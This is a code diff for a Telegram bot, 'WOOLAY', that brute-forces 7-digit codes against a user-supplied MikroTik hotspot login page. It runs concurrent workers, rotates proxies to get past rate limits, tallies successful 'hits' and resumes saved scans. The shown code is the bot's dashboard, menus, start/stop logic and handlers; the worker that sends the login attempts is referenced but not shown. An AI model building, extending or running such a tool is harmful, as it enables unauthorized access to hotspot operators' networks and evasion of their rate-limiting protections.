+
+            hits_text = build_hits_text(state.get("hit_details", []), state["hits"])
+
+            text = (
                 "╔═════════════════════════╗\n"
                 "║  ⚡ <b>WOOLAY MIKROTIK</b> ⚡  ║\n"
                 "║     7 DIGIT SCANNER     ║\n"
                 "╚═════════════════════════╝\n\n"
+                "🔍 <b>SEARCHING...</b>\n\n"
                 "📊 <b>STATS</b>\n"
-                f"├ 👁️ Tested  <code>{st['tried']:,}</code>\n"
-                f"├ 🩸 Hits    <code>{st['hits']}</code>\n"
-                f"├ ⚠️ Limits  <code>{st['limits']}</code>\n"
-                f"└ ❌ Errors  <code>{st['net']}</code>\n\n"
+                f"├ 💡 Tested  <code>{state['tried_n']:,}</code>\n"
+                f"├ 👊🏻 Hits    <code>{state['hits']}</code>\n"
+                f"├ ⚠️ Limits  <code>{state['limits']}</code>\n"
+                f"└ ❌ Errors  <code>{state['net']}</code>\n\n"
                 "⚡ <b>SPEED</b>\n"
-                f"├ 🚀 <code>{spm:,} c/m</code>\n"
-                f"├ 👥 Workers <code>{WORKERS}</code>\n"
-                f"└ 🕷️ <code>{px}</code>\n\n"
+                f"├ 🧑🏻‍💻 <code>{speed_cpm:,} c/m</code>\n"
+                f"├ 👥 Workers <code>{NUM_WORKERS}</code>\n"
+                f"└ ☠️ <code>{proxy_mode}</code>\n\n"
                 "🎯 <b>NOW</b>\n"
-                f"├ 🔮 <code>{st.get('cur') or '—'}</code>\n"
-                f"├ 🗡️ <code>{st.get('last_hit') or '—'}</code>\n"
-                f"└ 📜 <code>{ll}</code>\n\n"
-                f"{_hits_text(st.get('hit_details',[]), st['hits'])}\n\n"
+                f"├ 🕴🏻 Code    <code>{state.get('current_code') or '—'}</code>\n"
+                f"├ ⚓ LastHit <code>{state.get('last_hit') or '—'}</code>\n"
+                f"└ 🌳 Log     <code>{last_log}</code>\n\n"
+                f"{hits_text}\n\n"
                 f"╭─ ⚡ WOOLAY · {OWNER} ─╮"
             )
+
+            markup = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan")]
+            ])
+
             try:
-                await ctx.bot.edit_message_text(
-                    uid, mid, txt,
+                await context.bot.edit_message_text(
+                    chat_id=user_id,
+                    message_id=dash_msg_id,
+                    text=text,
                     parse_mode=ParseMode.HTML,
-                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")]]))
-            except: pass
-    except asyncio.CancelledError: raise
+                    reply_markup=markup,
+                )
+            except Exception:
+                pass
 
-async def _dash_final(ctx, uid, st):
-    pm  = PM()
-    el  = max(time.time() - st["t0"], 1)
-    spm = int(st["tried"] / el * 60)
-    px  = f"🕷️ {pm.count}" if pm.count else "⚡ DIRECT"
+    except asyncio.CancelledError:
+        raise
 
-    txt = (
+async def dashboard_final(context, user_id: int, state: dict):
+    pm = get_proxy_manager()
+    proxy_count = pm.get_count()
+    elapsed = max(time.time() - state["start_time"], 1)
+    speed_cpm = int(state["tried_n"] / elapsed * 60)
+    proxy_mode = f"🕷️ {proxy_count}" if proxy_count > 0 else "⚡ DIRECT"
+
+    hits_text = build_hits_text(state.get("hit_details", []), state["hits"], max_show=90)
+
+    text = (
         "╔═════════════════════════╗\n"
-        "║   💀 <b>SCAN ENDED</b> 💀    ║\n"
+        "║   💀 <b>SCAN STOPPED</b> 💀   ║\n"
         "║      ⚡ <b>WOOLAY</b> ⚡      ║\n"
         "╚═════════════════════════╝\n\n"
         "📊 <b>FINAL</b>\n"
-        f"├ 👁️ Tested  <code>{st['tried']:,}</code>\n"
-        f"├ 🩸 Hits    <code>{st['hits']}</code>\n"
-        f"├ ⚠️ Limits  <code>{st['limits']}</code>\n"
-        f"├ ❌ Errors  <code>{st['net']}</code>\n"
-        f"├ 🚀 Speed   <code>{spm:,} c/m</code>\n"
-        f"└ 🕷️ <code>{px}</code>\n\n"
-        f"{_hits_text(st.get('hit_details',[]), st['hits'], 90)}\n\n"
-        "💾 <i>Saved — START to resume</i>\n\n"
-        f"╭─ ⚡ WOOLAY · {OWNER} ─╮"
+        f"├ 💡 Tested  <code>{state['tried_n']:,}</code>\n"
+        f"├ 👊🏻 Hits    <code>{state['hits']}</code>\n"
+        f"├ ⚠️ Limits  <code>{state['limits']}</code>\n"
+        f"├ ❌ Errors  <code>{state['net']}</code>\n"
+        f"├ 🧑🏻‍💻 Speed   <code>{speed_cpm:,} c/m</code>\n"
+        f"└ 🌾 <code>{proxy_mode}</code>\n\n"
+        f"{hits_text}\n\n"
+        "💾 <i>Saved — /start to resume</i>\n\n"
+        f"╭─ ☠️ WOOLAY · {OWNER} ─╮"
     )
+
+    markup = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🖕🏻 BACK", callback_data="btn_back")]
+    ])
+
     try:
-        await ctx.bot.edit_message_text(
-            uid, st["dash_id"], txt,
+        await context.bot.edit_message_text(
+            chat_id=user_id,
+            message_id=state["dash_msg_id"],
+            text=text,
             parse_mode=ParseMode.HTML,
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="btn_back")]]))
-    except: pass
+            reply_markup=markup,
+        )
+    except Exception:
+        pass
 
-# ==============================================================================
-#  RUN
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
+#  STOP
+# ═══════════════════════════════════════════════════════════════
 
-async def run_scan(ctx, uid):
-    if scanners.get(uid, {}).get("running"): return
+async def stop_scanner(user_id: int, context=None) -> bool:
+    state = user_scanners.get(user_id)
+    if not state or not state.get("running"):
+        return False
 
-    pm  = PM()
-    url = ctx.user_data.get("login_url", "")
-    if not url:
-        await ctx.bot.send_message(uid, "❌ Login URL မထည့်ရသေး\n🔮 LOGIN URL နှိပ်ပါ", parse_mode=ParseMode.HTML)
+    log(YELLOW + f"[STOP] User {user_id}" + RESET)
+    state["stop_event"].set()
+
+    await asyncio.sleep(2)
+
+    flush_pending_codes(user_id)
+    save_current_state(user_id, state)
+
+    if context is not None:
+        try:
+            await dashboard_final(context, user_id, state)
+        except Exception:
+            pass
+
+    state["running"] = False
+    return True
+
+# ═══════════════════════════════════════════════════════════════
+#  RUN SCANNER
+# ═══════════════════════════════════════════════════════════════
+
+async def run_scanner(context, user_id: int):
+    if user_scanners.get(user_id, {}).get("running"):
         return
 
-    sv = get_state(uid)
-    resume = bool(sv and sv.get("url") == url)
-    if sv and not resume:
-        clr_state(uid); clr_tried(uid); sv = None
+    pm = get_proxy_manager()
+    login_url = context.user_data.get("login_url", "")
 
-    if resume and sv:
-        tried_set = load_tried(uid)
-        hd = []
-        for h in sv.get("hit_details", []):
-            try:    t = datetime.datetime.strptime(h.get("at",""), "%Y-%m-%d %H:%M:%S")
-            except: t = datetime.datetime.now()
-            hd.append({"code": h.get("code","?"), "time": t})
-        mode    = sv.get("mode","num7")
-        counter = sv.get("counter", 0)
-        tried   = sv.get("tried", 0)
-        hits    = sv.get("hits", 0)
-        limits  = sv.get("limits", 0)
-        net     = sv.get("net", 0)
-        failed  = sv.get("failed", 0)
-        last    = sv.get("last_hit")
-        sat     = sv.get("started_at", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+    if not login_url:
+        await context.bot.send_message(
+            user_id,
+            "❌ Login URL ထည့်ပါ!\n🔮 LOGIN URL ကို နှိပ်ပါ",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    # Resume check
+    saved = get_saved_state(user_id)
+    resume = False
+
+    if saved and saved.get("url") == login_url:
+        resume = True
+        log(CYAN + f"[Resume] User {user_id}" + RESET)
+    elif saved:
+        clear_saved_state(user_id)
+        clear_tried(user_id)
+        saved = None
+
+    if resume and saved:
+        tried_set = load_tried_set(user_id)
+        hit_details = []
+        for h in saved.get("hit_details", []):
+            try:
+                t = datetime.datetime.strptime(h.get("at", ""), "%Y-%m-%d %H:%M:%S")
+            except Exception:
+                t = datetime.datetime.now()
+            hit_details.append({"code": h.get("code", "?"), "time": t})
+
+        mode      = saved.get("mode", "num7")
+        counter   = saved.get("counter", 0)
+        tried_n   = saved.get("tried_n", 0)
+        hits      = saved.get("hits", 0)
+        limits    = saved.get("limits", 0)
+        net       = saved.get("net", 0)
+        failed    = saved.get("failed", 0)
+        last_hit  = saved.get("last_hit")
+        started_at = saved.get("started_at", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
     else:
-        tried_set = set(); hd = []
-        mode    = ctx.user_data.get("mode", "num7")
-        counter = tried = limits = net = failed = hits = 0
-        last = None
-        sat = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        tried_set   = set()
+        hit_details = []
+        mode      = context.user_data.get("mode", "num7")
+        counter   = 0
+        tried_n   = 0
+        hits      = 0
+        limits    = 0
+        net       = 0
+        failed    = 0
+        last_hit  = None
+        started_at = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    st = {
-        "running": True, "login_url": url, "mode": mode,
-        "counter": counter, "stop": asyncio.Event(),
-        "tried": tried, "hits": hits, "limits": limits, "net": net, "failed": failed,
-        "hit_list": [h["code"] for h in hd], "tried": tried, "tried_codes": tried_set,
-        "logs": [], "last_hit": last, "cur": None,
-        "t0": time.time(), "hit_details": hd, "started_at_str": sat,
+    # Build state dict — NO duplicate keys
+    state = {
+        "running":       True,
+        "login_url":     login_url,
+        "mode":          mode,
+        "counter":       counter,
+        "stop_event":    asyncio.Event(),
+        "tried_n":       tried_n,          # int: count of tried codes
+        "hits":          hits,             # int: count of hits
+        "limits":        limits,
+        "net":           net,
+        "failed":        failed,
+        "hit_list":      [h["code"] for h in hit_details],
+        "tried_set":     tried_set,        # set: tried code strings
+        "recent_logs":   [],
+        "last_hit":      last_hit,
+        "current_code":  None,
+        "start_time":    time.time(),
+        "hit_details":   hit_details,
+        "started_at_str": started_at,
     }
-    scanners[uid] = st
+    user_scanners[user_id] = state
 
-    msg = await ctx.bot.send_message(uid, "🔁 RESUMING" if resume else "⚡ Starting...", parse_mode=ParseMode.HTML)
-    st["dash_id"] = msg.message_id
-    save_state(uid, st)
+    # Send dashboard message
+    start_text = "🔁 <b>RESUMING...</b>" if resume else "⚡ <b>Starting...</b>"
+    dash_msg = await context.bot.send_message(user_id, start_text, parse_mode=ParseMode.HTML)
+    state["dash_msg_id"] = dash_msg.message_id
 
-    tasks = [asyncio.create_task(_worker(i, uid)) for i in range(WORKERS)]
-    tasks.append(asyncio.create_task(_dash(ctx, uid)))
-    st["tasks"] = tasks
+    save_current_state(user_id, state)
+
+    # Create workers
+    tasks = []
+    for i in range(NUM_WORKERS):
+        task = asyncio.create_task(scanner_worker(i, user_id))
+        tasks.append(task)
+
+    # Dashboard updater
+    dash_task = asyncio.create_task(dashboard_updater(context, user_id))
+    tasks.append(dash_task)
+
+    state["tasks"] = tasks
 
     try:
-        await st["stop"].wait()
+        await state["stop_event"].wait()
     finally:
         for t in tasks:
-            if not t.done(): t.cancel()
+            if not t.done():
+                t.cancel()
         await asyncio.gather(*tasks, return_exceptions=True)
-        flush_tried(uid); save_state(uid, st)
-        try: await _dash_final(ctx, uid, st)
-        except: pass
-        st["running"] = False
 
-# ==============================================================================
-#  MENU
-# ==============================================================================
+        flush_pending_codes(user_id)
+        save_current_state(user_id, state)
 
-MODES = {"num7": "🩸 07 Sequential", "rand7": "🎲 07 Random"}
+        try:
+            await dashboard_final(context, user_id, state)
+        except Exception:
+            pass
 
-def main_kb():
+        state["running"] = False
+
+# ═══════════════════════════════════════════════════════════════
+#  KEYBOARDS
+# ═══════════════════════════════════════════════════════════════
+
+MODES = {
+    "num7":  "🩸 07 Sequential",
+    "rand7": "🎲 07 Random",
+}
+
+def main_keyboard():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔮 LOGIN URL", callback_data="btn_url"),
-         InlineKeyboardButton("📜 MODES", callback_data="btn_mode")],
-        [InlineKeyboardButton("⚡ START", callback_data="btn_start"),
-         InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")],
-        [InlineKeyboardButton("👁️ STATUS", callback_data="btn_status"),
-         InlineKeyboardButton("🧹 CLEAR", callback_data="btn_clr")],
-        [InlineKeyboardButton("🕷️ PROXIES", callback_data="btn_proxy")],
-        [InlineKeyboardButton("⚡ WOOLAY ⚡", url=OWNER_LINK)],
+        [
+            InlineKeyboardButton("🌳 LOGIN URL", callback_data="btn_url"),
+            InlineKeyboardButton("📜 MODES", callback_data="btn_mode"),
+        ],
+        [
+            InlineKeyboardButton("☠️ START", callback_data="btn_start"),
+            InlineKeyboardButton("🛑 STOP", callback_data="stop_scan"),
+        ],
+        [
+            InlineKeyboardButton("🕴🏻 STATUS", callback_data="btn_status"),
+            InlineKeyboardButton("🧹 CLEAR", callback_data="btn_clear"),
+        ],
+        [
+            InlineKeyboardButton("🤖 PROXIES", callback_data="btn_proxy"),
+        ],
+        [
+            InlineKeyboardButton("☠️ WOOLAY ☠️", url=OWNER_LINK),
+        ],
     ])
 
-def mode_kb():
+def mode_keyboard():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🩸 07 Sequential", callback_data="m_num7"),
-         InlineKeyboardButton("🎲 07 Random", callback_data="m_rand7")],
-        [InlineKeyboardButton("🦇 BACK", callback_data="btn_back")],
+        [
+            InlineKeyboardButton("🩸 07 Sequential", callback_data="m_num7"),
+            InlineKeyboardButton("🎲 07 Random", callback_data="m_rand7"),
+        ],
+        [
+            InlineKeyboardButton("🖕🏻 BACK", callback_data="btn_back"),
+        ],
     ])
 
-def back_kb():
-    return InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="btn_back")]])
+def back_keyboard():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🖕🏻 BACK", callback_data="btn_back")],
+    ])
 
-def menu_txt(mode, act, url, uid):
-    px = f"🕷️ Proxies: <code>{act}</code>" if act else "⚡ Direct"
-    ul = "🔮 URL: ✅" if url else "❌ URL: Not set"
-    rv = ""
-    sv = get_state(uid)
-    if sv and sv.get("url") == (url or ""):
-        rv = (f"\n💾 <b>Saved</b>\n"
-              f"├ Tried: <code>{sv.get('tried',0):,}</code>\n"
-              f"├ Hits:  <code>{sv.get('hits',0)}</code>\n"
-              f"└ Mode:  <code>{MODES.get(sv.get('mode','num7'),'')}</code>\n")
-    return (f"╔═════════════════════════╗\n"
-            "║     ⚡ <b>WOOLAY</b> ⚡       ║\n"
-            "║  MIKROTIK × 7 DIGIT   ║\n"
-            "╚═════════════════════════╝\n\n"
-            f"📜 Mode: <code>{MODES.get(mode,mode)}</code>\n"
-            f"{px}\n"
-            f"⚡ Workers: <code>{WORKERS}</code>\n"
-            f"{ul}\n{rv}")
+def build_menu_text(mode: str, proxy_count: int, login_url: str, user_id: int) -> str:
+    if proxy_count > 0:
+        proxy_line = f"🕷️ Proxies: <code>{proxy_count}</code>"
+    else:
+        proxy_line = "⚡ Direct Mode"
 
-# ==============================================================================
-#  HANDLERS
-# ==============================================================================
+    if login_url:
+        url_line = f"🔥 URL: ✅\n<code>{login_url}</code>"
+    else:
+        url_line = "❌ URL: Not set"
 
-async def cmd_start(up, ctx):
-    uid = up.effective_user.id
-    pm  = PM()
-    txt = menu_txt(ctx.user_data.get("mode","num7"), pm.count, ctx.user_data.get("login_url",""), uid)
-    await up.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())
+    resume_line = ""
+    saved = get_saved_state(user_id)
+    if saved and saved.get("url") == login_url:
+        resume_line = (
+            f"\n💾 <b>Saved Job</b>\n"
+            f"├ Tried: <code>{saved.get('tried_n', 0):,}</code>\n"
+            f"├ Hits:  <code>{saved.get('hits', 0)}</code>\n"
+            f"└ Mode:  <code>{MODES.get(saved.get('mode', 'num7'), '')}</code>\n"
+        )
 
-async def on_btn(up, ctx):
-    q = up.callback_query; await q.answer()
-    uid = q.from_user.id; d = q.data
+    return (
+        "╔═════════════════════════╗\n"
+        "║     ☠️ <b>WOOLAY</b> ☠️       ║\n"
+        "║  MIKROTIK × 7 DIGIT   ║\n"
+        "╚═════════════════════════╝\n\n"
+        f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n"
+        f"{proxy_line}\n"
+        f"⚡ Workers: <code>{NUM_WORKERS}</code>\n"
+        f"{url_line}\n"
+        f"{resume_line}\n"
+        "💡 <i>/stop to stop scan</i>"
+    )
 
-    if d == "btn_back":
-        txt = menu_txt(ctx.user_data.get("mode","num7"), PM().count, ctx.user_data.get("login_url",""), uid)
-        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())
+# ═══════════════════════════════════════════════════════════════
+#  COMMAND HANDLERS
+# ═══════════════════════════════════════════════════════════════
 
-    elif d == "btn_url":
-        ctx.user_data["wait_url"] = True
-        await q.edit_message_text(
-            "🔮 <b>Send MikroTik Login URL</b>\n\nExample:\n<code>http://hotspot.example.com/login</code>",
-            parse_mode=ParseMode.HTML, reply_markup=back_kb())
+async def cmd_start(update, context):
+    user_id = update.effective_user.id
 
-    elif d == "btn_mode":
-        await q.edit_message_text("📜 <b>Select Mode</b>", parse_mode=ParseMode.HTML, reply_markup=mode_kb())
+    # Initialize user_data
+    if "mode" not in context.user_data:
+        context.user_data["mode"] = "num7"
+    if "login_url" not in context.user_data:
+        context.user_data["login_url"] = ""
 
-    elif d.startswith("m_"):
-        m = d[2:]
-        ctx.user_data["mode"] = m
-        txt = menu_txt(m, PM().count, ctx.user_data.get("login_url",""), uid)
-        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())
+    pm = get_proxy_manager()
+    mode = context.user_data["mode"]
+    login_url = context.user_data["login_url"]
 
-    elif d == "btn_start":
-        if scanners.get(uid, {}).get("running"):
-            await q.answer("⚠️ Running!", show_alert=True); return
-        if not ctx.user_data.get("login_url"):
-            await q.answer("❌ Set URL first!", show_alert=True); return
-        await q.edit_message_text("⚡ <b>Starting...</b>", parse_mode=ParseMode.HTML)
-        asyncio.create_task(run_scan(ctx, uid))
+    text = build_menu_text(mode, pm.get_count(), login_url, user_id)
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_keyboard())
 
-    elif d == "stop_scan":
-        st = scanners.get(uid)
-        if st and st.get("running"):
-            st["stop"].set(); await q.answer("🛑 Stopping...")
-        else: await q.answer("Not running", show_alert=True)
+async def cmd_stop(update, context):
+    """ /stop command to stop scanning """
+    user_id = update.effective_user.id
+    stopped = await stop_scanner(user_id, context)
+    if stopped:
+        await update.message.reply_text(
+            "🛑 <b>SCAN STOPPED</b>\n\n💾 Saved\n💡 /start to resume",
+            parse_mode=ParseMode.HTML,
+        )
+    else:
+        await update.message.reply_text(
+            "⚠️ No scan running",
+            parse_mode=ParseMode.HTML,
+        )
 
-    elif d == "btn_status":
-        pm = PM()
-        await q.edit_message_text(f"🕷️ <b>Proxy</b>\n\nActive: <code>{pm.count}</code>\nBad: <code>{len(pm.bad)}</code>",
-                                   parse_mode=ParseMode.HTML, reply_markup=back_kb())
+# ═══════════════════════════════════════════════════════════════
+#  CALLBACK HANDLER
+# ═══════════════════════════════════════════════════════════════
 
-    elif d == "btn_clr":
-        pm = PM(); pm.proxies = []; pm.bad = set(); pm._write()
-        await q.edit_message_text("🧹 <b>Cleared</b>", parse_mode=ParseMode.HTML, reply_markup=back_kb())
+async def on_callback(update, context):
+    query = update.callback_query
+    await query.answer()
 
-    elif d == "btn_proxy":
-        ctx.user_data["wait_px"] = True
-        await q.edit_message_text(
-            "🕷️ <b>Send proxies</b> (one/line)\n\n<code>host:port</code>\n<code>host:port:user:pass</code>\n<code>socks5://host:port</code>",
-            parse_mode=ParseMode.HTML, reply_markup=back_kb())
+    user_id = query.from_user.id
+    data = query.data
 
-async def on_msg(up, ctx):
-    uid = up.effective_user.id; txt = up.message.text
+    # Ensure user_data defaults
+    if "mode" not in context.user_data:
+        context.user_data["mode"] = "num7"
+    if "login_url" not in context.user_data:
+        context.user_data["login_url"] = ""
 
-    if ctx.user_data.get("wait_url"):
-        ctx.user_data["wait_url"] = False
-        ctx.user_data["login_url"] = txt.strip()
-        m = ctx.user_data.get("mode","num7")
-        menu = menu_txt(m, PM().count, txt.strip(), uid)
-        await up.message.reply_text("✅ <b>URL Saved!</b>", parse_mode=ParseMode.HTML)
-        await up.message.reply_text(menu, parse_mode=ParseMode.HTML, reply_markup=main_kb())
+    if data == "btn_back":
+        pm = get_proxy_manager()
+        mode = context.user_data["mode"]
+        login_url = context.user_data["login_url"]
+        text = build_menu_text(mode, pm.get_count(), login_url, user_id)
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=main_keyboard())
 
-    elif ctx.user_data.get("wait_px"):
-        ctx.user_data["wait_px"] = False
-        pm = PM()
-        a, b = pm.add(txt.strip().splitlines())
-        await up.message.reply_text(
-            f"🕷️ <b>Proxies</b>\n✅ Valid: <code>{a}</code>\n❌ Invalid: <code>{b}</code>\n📦 Total: <code>{pm.count}</code>",
-            parse_mode=ParseMode.HTML)
+    elif data == "btn_url":
+        context.user_data["awaiting_url"] = True
+        current = context.user_data.get("login_url", "Not set")
+        await query.edit_message_text(
+            f"🔮 <b>Send Login URL</b>\n\nCurrent:\n<code>{current}</code>\n\nNew URL:",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_keyboard(),
+        )
 
-# ==============================================================================
+    elif data == "btn_mode":
+        await query.edit_message_text(
+            "📜 <b>Select Mode</b>",
+            parse_mode=ParseMode.HTML,
+            reply_markup=mode_keyboard(),
+        )
+
+    elif data.startswith("m_"):
+        mode = data[2:]
+        context.user_data["mode"] = mode
+        pm = get_proxy_manager()
+        login_url = context.user_data["login_url"]
+        text = build_menu_text(mode, pm.get_count(), login_url, user_id)
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=main_keyboard())
+
+    elif data == "btn_start":
+        if user_scanners.get(user_id, {}).get("running"):
+            await query.answer("⚠️ Already running!", show_alert=True)
+            return
+        login_url = context.user_data.get("login_url", "")
+        if not login_url:
+            await query.answer("❌ Set URL first!", show_alert=True)
+            return
+        await query.edit_message_text("⚡ <b>Starting...</b>", parse_mode=ParseMode.HTML)
+        asyncio.create_task(run_scanner(context, user_id))
+
+    elif data == "stop_scan":
+        stopped = await stop_scanner(user_id, context)
+        if stopped:
+            await query.answer("🛑 Stopped!")
+        else:
+            await query.answer("Not running", show_alert=True)
+
+    elif data == "btn_status":
+        pm = get_proxy_manager()
+        await query.edit_message_text(
+            f"🕷️ <b>Proxy Status</b>\n\nActive: <code>{pm.get_count()}</code>\nBad: <code>{len(pm.bad_proxies)}</code>",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_keyboard(),
+        )
+
+    elif data == "btn_clear":
+        pm = get_proxy_manager()
+        pm.proxies = []
+        pm.bad_proxies = set()
+        pm.save_file()
+        await query.edit_message_text(
+            "🧹 <b>Proxies Cleared</b>",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_keyboard(),
+        )
+
+    elif data == "btn_proxy":
+        context.user_data["awaiting_proxy"] = True
+        await query.edit_message_text(
+            "🕷️ <b>Send proxies</b> (one per line)\n\nFormat:\n<code>host:port</code>\n<code>host:port:user:pass</code>\n<code>socks5://host:port</code>",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_keyboard(),
+        )
+
+# ═══════════════════════════════════════════════════════════════
+#  MESSAGE HANDLER
+# ═══════════════════════════════════════════════════════════════
+
+async def on_message(update, context):
+    user_id = update.effective_user.id
+    text = update.message.text
+
+    if context.user_data.get("awaiting_url"):
+        context.user_data["awaiting_url"] = False
+        context.user_data["login_url"] = text.strip()
+        pm = get_proxy_manager()
+        mode = context.user_data.get("mode", "num7")
+        menu_text = build_menu_text(mode, pm.get_count(), text.strip(), user_id)
+        await update.message.reply_text("✅ <b>URL Saved!</b>", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(menu_text, parse_mode=ParseMode.HTML, reply_markup=main_keyboard())
+
+    elif context.user_data.get("awaiting_proxy"):
+        context.user_data["awaiting_proxy"] = False
+        pm = get_proxy_manager()
+        lines = text.strip().splitlines()
+        added, invalid = pm.add_proxies(lines)
+        await update.message.reply_text(
+            f"🕷️ <b>Proxies Added</b>\n✅ Valid: <code>{added}</code>\n❌ Invalid: <code>{invalid}</code>\n📦 Total: <code>{pm.get_count()}</code>",
+            parse_mode=ParseMode.HTML,
+        )
+
+# ═══════════════════════════════════════════════════════════════
 #  MAIN
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 
-async def _post_init(app):
-    banner()
-    log(GRN + "[Bot] Ready" + R)
+async def post_init(application):
+    show_banner()
+    log(GREEN + "[Bot] Ready" + RESET)
 
 def main():
+    # Start keep-alive web server
     keep_alive()
 
-    app = Application.builder().token(BOT_TOKEN).post_init(_post_init).build()
-    app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(CallbackQueryHandler(on_btn))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_msg))
+    # Build bot
+    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
-    log(GRN + "[Bot] Starting WOOLAY..." + R)
+    # Handlers
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("stop", cmd_stop))
+    app.add_handler(CallbackQueryHandler(on_callback))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
+
+    log(GREEN + "[Bot] Starting WOOLAY..." + RESET)
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
